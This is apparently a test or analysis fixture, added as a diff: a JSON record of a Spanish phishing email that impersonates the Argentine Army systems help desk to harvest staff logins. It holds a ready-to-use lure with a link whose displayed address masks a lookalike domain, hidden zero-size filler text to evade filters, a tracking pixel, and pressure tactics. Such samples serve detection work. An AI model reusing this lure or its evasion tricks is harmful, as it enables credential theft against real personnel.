@@ -1,0 +1,21 @@
+{
+  "from": "\"Mesa de Ayuda - Ejército Argentino\" <soporte.sistemas@ejercito-mil.ar>",
+  "to": "personal@ejercito.mil.ar",
+  "replyTo": "soporte.ejercito.ar@gmail.com",
+  "returnPath": "bounce@mailer-cloud.xyz",
+  "subject": "URGENTE: Su cuenta institucional será suspendida en 24 horas",
+  "date": "Tue, 16 Sep 2026 09:12:44 -0300",
+  "messageId": "<20260916121244.9f2a1c@mailer-cloud.xyz>",
+  "headers": {
+    "Received": [
+      "from mail.ejercito.mil.ar (mail.ejercito.mil.ar [10.20.30.5]) by mx1.ejercito.mil.ar with ESMTP id 8Kq9; Tue, 16 Sep 2026 09:12:50 -0300",
+      "from srv-01.mailer-cloud.xyz (unknown [185.220.101.4]) by mail.ejercito.mil.ar with ESMTP; Tue, 16 Sep 2026 09:12:46 -0300"
+    ],
+    "Authentication-Results": "mx1.ejercito.mil.ar; spf=fail (sender IP is 185.220.101.4) smtp.mailfrom=mailer-cloud.xyz; dkim=none; dmarc=fail (p=reject) header.from=ejercito-mil.ar",
+    "X-Mailer": "PHPMailer 6.8.0",
+    "X-Priority": "1 (Highest)"
+  },
+  "text": "Estimado personal,\n\nDetectamos actividad inusual en su cuenta institucional. Por disposición de la Jefatura de Sistemas, todas las cuentas deben ser verificadas de inmediato.\n\nSi no confirma su identidad en las próximas 24 horas, su cuenta será suspendida y perderá acceso al sistema de haberes y legajo.\n\nIngrese con su usuario y contraseña aquí: https://intranet.ejercito.mil.ar\n\nJefatura de Sistemas\nComando de Comunicaciones",
+  "html": "<html><body style=\"font-family:Arial\"><p>Estimado personal,</p><p>Detectamos actividad inusual en su cuenta institucional. Por disposición de la <b>Jefatura de Sistemas</b>, todas las cuentas deben ser verificadas <b>de inmediato</b>.</p><p>Si no confirma su identidad en las próximas <b>24 horas</b>, su cuenta será <b>suspendida</b> y perderá acceso al sistema de haberes y legajo.</p><p>Ingrese con su usuario y contraseña aquí: <a href=\"https://portal-ejercito-argentina.com.ar/cuenta/verificar?id=7731\">https://intranet.ejercito.mil.ar</a></p><p style=\"font-size:0px;color:#fff\">lorem ipsum dolor sit amet consectetur seguridad institucional verificacion</p><img src=\"https://portal-ejercito-argentina.com.ar/t.gif?u=7731\" width=\"1\" height=\"1\"><p>Jefatura de Sistemas<br>Comando de Comunicaciones</p></body></html>",
+  "attachments": []
+}
